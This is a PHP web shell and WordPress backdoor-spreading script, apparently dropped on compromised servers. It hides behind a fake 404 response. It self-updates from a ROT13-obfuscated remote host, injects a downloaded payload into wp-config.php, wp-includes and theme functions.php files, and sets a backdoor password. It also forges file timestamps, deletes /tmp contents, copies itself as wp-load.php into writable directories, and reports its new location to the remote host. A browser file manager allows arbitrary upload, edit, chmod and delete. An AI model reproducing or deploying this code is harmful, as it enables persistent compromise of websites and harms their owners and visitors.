<?php
set_time_limit(0);
error_reporting(1);
if ( array_key_exists ('update', $_GET)){


        $ch = curl_init( str_rot13('uggc://jj.fravbef-qngvat.bet/yax/svyr.gkg') );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $result = curl_exec($ch);
        curl_close($ch);

        if (!empty($result)){

            copy (__FILE__, __DIR__ . "/oldbackup.php");
            file_put_contents(__FILE__, $result);
            echo "update ok\n";
            exit();

        }
    
}


if ( array_key_exists ('cuquoo', $_GET)){
    function str_replace_first($from, $to, $content)
{
    $from = '/'.preg_quote($from, '/').'/';

    return preg_replace($from, $to, $content, 1);
}

function findWordpress ($path, $depth = 3) {

    try {
            $di = new RecursiveDirectoryIterator($path ,RecursiveDirectoryIterator::SKIP_DOTS);
            $it = new RecursiveIteratorIterator($di);
            $it->setMaxDepth($depth);
            $results = [];

            foreach($it as $file) {

                if (  preg_match ( '#wp-config\.php$#', $file ) ) {
            
                    $results[] = dirname(realpath($file));
                }
    
            }

        }
        catch (Exception $e) 
        {
            $results = [];
        }
    
        return $results;
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }

    if (!is_dir($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }

    }

    return rmdir($dir);
}

function isHttps() {
    if ((!empty($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') ||
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ||
        (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ||
        (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] == 'on') ||
        (!empty($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443')) {
        $server_request_scheme = 'https';
    } else {
        $server_request_scheme = 'http';
    }
    return $server_request_scheme;
}

function findWriteableDir ($path, $depth = 3) {

    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST,
            RecursiveIteratorIterator::CATCH_GET_CHILD // Ignore "Permission denied"
        );
            $it->setMaxDepth($depth);
            $paths = [];

            foreach ($it as $path => $dir) {
                if ($dir->isDir() && is_writable ($dir)) {
                    $paths[] = $path;
                }
            }

        }
        catch (Exception $e) 
        {
            var_dump($e);
            $paths = [];
        }
    
        return $paths;
}

function findThemes ($path, $depth = 1) {

    $di = new RecursiveDirectoryIterator($path ,RecursiveDirectoryIterator::SKIP_DOTS);
    $it = new RecursiveIteratorIterator($di);
    $it->setMaxDepth($depth);
    $results = [];

    foreach($it as $file) {

        if (  preg_match ( '#functions\.php$#', $file ) ) {
            $results[] = dirname(realpath($file));
        }
    }
    
    return $results;
}

function download($url, $path){

    $dir = dirname($path);
    $lastMtime = filemtime ($dir);

    $fp = fopen($path, "w+");
    $ch = curl_init ($url);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt ($ch, CURLOPT_FILE, $fp);
    curl_exec ($ch);
    curl_close ($ch);
    fclose($fp);

    touch($path, $lastMtime);
    touch($dir, $lastMtime);
}

function curlget($url) {

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $result = curl_exec($ch);
    curl_close($ch);
return $result;
}

$injectUrl = str_rot13('uggc://jj.fravbef-qngvat.bet/yax/vawrpg.gkg');
$codeWpConfig = "include_once(ABSPATH . WPINC . '/header.php');";

$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$rootDir = './';
$dots = substr_count (parse_url($actual_link)['path'], '/') - 1;
$checkWord = '$algo = \'default\'; $pass =';
$pass = 'Zgc5c4MXrK42MQsM7IlQPPeZfl3OdrpdmmSLH6uToRkH';

for ($i=1;$i<=$dots;$i++){      
    $rootDir.="../";
}

    $rootDirRaw = $rootDir;
    $rootDir = realpath($rootDir);
    echo "RootDir: {$rootDir}\n";
    $wordpressA = findWordpress ("{$rootDir}/../", 2);
    $wordpressB = findWordpress ("{$rootDir}/", 1);

    $wordpress = array_unique (array_merge ($wordpressA, $wordpressB));

    print_r($wordpress);

    foreach($wordpress as $wp) {

        $wpPath = $wp;
        echo $wpPath ."\n";


        if ( is_writable ( "{$wpPath}/wp-includes") ) {
            echo "wp-includes writable\n";
            download($injectUrl, "{$wpPath}/wp-includes/header.php");
      
            $lastMtime = filemtime ("{$wpPath}/wp-config.php" ) + rand(1, 1000);

            $wpConfig = file_get_contents("{$wpPath}/wp-config.php");
    
       
            if (!strpos($wpConfig, $codeWpConfig) !== false) {
             
                $wpConfig = preg_replace('#wp-settings\.php[\'"]{1}\s?\)?;#', "$0\n{$codeWpConfig}\n", $wpConfig, 1);
                file_put_contents("{$wpPath}/wp-config.php", $wpConfig);
                    
            }
            else{
        
                echo "wpconfig skipped\n";
    
            }

            $functionsFile = file_get_contents("{$wpPath}/wp-includes/functions.php");
            $functionsFileMtime = filemtime ("{$wpPath}/wp-includes/functions.php");
            
            if (strpos($functionsFile, $checkWord) !== false) {
                echo "functions.php pass found\n";

                if (strpos($functionsFile, $pass) !== false) {
                    echo "functions.php good pass, skipped\n";
                  
                } else{
                    
                    $functionsFile = preg_replace('#pass = "[^"]*"#', 'pass = "' . $pass . '"', $functionsFile);
            
                    echo "functions.php pass replaced\n";
                    file_put_contents("{$wpPath}/wp-includes/functions.php.old", $functionsFile);
                    rename("{$wpPath}/wp-includes/functions.php.old", "{$wpPath}/wp-includes/functions.php");
                    touch("{$wpPath}/wp-includes/functions.php", $functionsFileMtime);
                }
            
            }

            touch ("{$wpPath}/wp-config.php", $lastMtime);

}else{
    echo "wp-includes non-writable\n";
}

    $themes = findThemes ("{$wpPath}/wp-content/themes");
    print_r($themes);


    $inject = curlget ($injectUrl);
    $inject = str_replace_first('<?php', '', $inject);
    $inject = substr($inject, 0, strrpos($inject, "\n"));

    foreach($themes as $theme){

        $template = file_get_contents("{$theme}/functions.php");
        $lastMtime = filemtime ("{$theme}/functions.php");

        if (strpos($template, $checkWord) !== false) {
            echo "{$theme} pass found\n";
            
            if (strpos($template, $pass) !== false) {
                echo "{$theme} good pass, skipped\n";
                
              
            } else{
                
                $template = preg_replace('#pass = "[^"]+"#', 'pass = "' . $pass . '"', $template);
        
                echo "{$theme} pass replaced\n";
                file_put_contents("{$theme}/functions.php.old", $template);
                rename("{$theme}/functions.php.old", "{$theme}/functions.php");
                touch("{$theme}/functions.php", $lastMtime);
            }

        } 
        else {

            $template = str_replace_first('<?php', "<?php\n" . $inject, $template);

            file_put_contents("{$theme}/functions.php.old", $template);
            rename("{$theme}/functions.php.old", "{$theme}/functions.php");
            touch("{$theme}/functions.php", $lastMtime);

        }




    }

$filesDelList = glob('/tmp/*');

foreach($filesDelList as $f){
  if(is_file($f))
    unlink($f);
}

echo "{$wp} end\n\n";
    
}


    $writeableDirs = findWriteableDir ("{$rootDir}/", 3);
    
    if (!empty($writeableDirs)) {

        $newDir = $writeableDirs[array_rand($writeableDirs, 1)];
        $newName = 'wp-load.php';
        $absoluteDir = realpath($newDir);
        $lastMtime = filemtime ($absoluteDir);


        copy (__FILE__, "{$absoluteDir}/{$newName}");
        
        touch($absoluteDir, $lastMtime);
        touch("{$absoluteDir}/{$newName}", $lastMtime);

        if ( filesize ("{$absoluteDir}/{$newName}") ){

            $shPath = str_replace($rootDir, '', "{$absoluteDir}/{$newName}");

            echo "{$newDir}/{$newName} ok\n";
            $knockScheme = isHttps();
            $knock = "{$knockScheme}://{$_SERVER['HTTP_HOST']}{$shPath};{$absoluteDir}/{$newName}";
            $curl = curl_init(str_rot13('uggc://jj.fravbef-qngvat.bet/yax/onpxhc.cuc'));
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $knock);
            curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
            $response = curl_exec($curl);
            curl_close($curl);
/*
            if (strpos(__DIR__, 'elasta') !== false) {
                deleteDirectory(__DIR__);
            }
            else{
            
                unlink(__FILE__);
            
            }
*/
    
        }
        else{
            echo "{$newDir}/{$newName} NEOK\n";
        }

    } else{
        "writable dirs not found\n";
    }
    exit();
}

if (! array_key_exists ('web', $_GET)){

    http_response_code(404);
    exit();
}

echo '<!DOCTYPE HTML><html><head><title>lh</title>
<style>
body{font-family:"Racing Sans One",cursive;background-color:#dcdcdc;text-shadow:0 0 1px azure}#content tr:hover{background-color:#636263;text-shadow:0 0 10px #006400}#content .first{background-color:silver}#content .first:hover{background-color:#dcdcdc;text-shadow:0 0 1px #006400}table{border:1px azure dotted}H1{font-family:Rye,cursive}a{color:#006400;text-decoration:none}a:hover{color:#006400;text-shadow:0 0 10px #006400}input,select,textarea{border:1px #006400 solid;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px}
</style>
<meta name="robots" content="noindex" />
</head><body>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path: ';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?web&path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?web&path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr>
<tr data-path="' . $path . '"><td>Raw Path: ' . $path . '</tr></td>
<tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<b><br>'.php_uname().'<br></b>';
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
			
			function RDir( $path ) {
             if ( file_exists( $path ) AND is_dir( $path ) ) {
                $dir = opendir($path);
                while ( false !== ( $element = readdir( $dir ) ) ) {
                  if ( $element != '.' AND $element != '..' )  {
                    $tmp = $path . '/' . $element;
                    chmod( $tmp, 0777 );
                    if ( is_dir( $tmp ) ) {
                     RDir( $tmp );
                    } else {
                      unlink( $tmp );
                   }
                 }
               }
                closedir($dir);
               if ( file_exists( $path ) ) {
                 if (rmdir($path )) echo '<font color="green">Delete Dir Done.</font><br />';
			     else echo '<font color="red">Delete Dir Error.</font><br />';
               }
             }
            }
			
			RDir($_POST['path']);
			
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?web&path={$path}/{$dir}\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?web&option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?web&filesrc=$path/$file&path={$path}\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?web&option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

